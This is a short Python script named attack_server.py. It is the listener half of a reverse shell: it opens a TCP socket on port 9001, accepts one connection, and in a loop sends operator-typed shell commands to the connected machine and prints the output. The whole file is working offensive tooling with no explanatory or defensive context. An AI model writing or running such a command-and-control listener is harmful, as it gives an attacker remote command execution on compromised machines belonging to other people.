#attack_server.py
import socket
import os

host = '0.0.0.0'
port = 9001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.bind((host, port))
    print(f"Listening : {port}")
except socket.error as e:
    print(f"failed to start server : {e}")
    os.system("pause")
s.listen(1)

print('Waiting for connection...')


conn, addr = s.accept()
print('\n')
print('Connected by', addr)
while True:
    cmd = input('$')
    if(len(cmd)>0):
        conn.send(cmd.encode())
        try:
            print("wait for client message...")
            client_response = conn.recv(10000)
            print(client_response.decode())
        except Exception as e:
            print(e)
